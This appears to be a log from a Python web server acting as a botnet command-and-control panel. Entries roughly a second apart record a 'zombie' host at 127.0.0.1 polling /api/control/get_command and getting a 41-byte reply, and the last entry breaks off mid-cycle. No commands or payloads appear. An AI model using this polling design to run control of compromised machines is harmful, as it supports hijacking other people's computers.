2025-06-25 00:14:31 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:32 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:33 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:34 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:35 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:36 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:37 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:38 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:39 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:40 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:41 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:42 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:43 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:44 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:45 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:46 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:48 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:49 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:50 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:51 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:52 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:53 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:54 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:55 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:56 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:57 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:58 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:59 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:00 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:01 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:02 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:03 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:04 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:05 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:06 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:07 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:08 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:09 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:10 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:11 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:12 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:13 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:14 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:15 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:16 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:17 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:18 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:19 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:20 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:21 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:22 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:23 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:24 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
